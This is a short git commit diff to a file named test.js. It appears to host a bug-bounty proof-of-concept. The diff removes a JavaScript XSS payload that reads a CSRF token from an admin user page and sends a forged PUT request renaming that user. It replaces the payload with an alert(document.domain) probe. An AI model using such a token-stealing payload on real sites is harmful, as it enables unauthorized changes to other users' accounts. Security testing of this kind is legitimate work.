d12157525c48815994b58c670e1341906bb1ddd4
ispomael <ispomael@gmail.com>
2025-12-11 08:18:19 +0100

    Update test.js

--- test.js
+++ test.js
@@ -1,11 +1,1 @@
-var req = new XMLHttpRequest();
-req.onload = handleResponse;
-req.open('get','/app/admin/users/78',true);
-req.send();
-function handleResponse() {
-    var token = this.responseText.match(/name="csrf-token" content="(\w+)"/)[1];
-    var changeReq = new XMLHttpRequest();
-    changeReq.open('put', '/app/admin/users/78', true);
-    changeReq.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
-    changeReq.send('_token='+token+'&_method=PUT&name=MaelD-Intigriti-PV')
-};
+alert(document.domain);
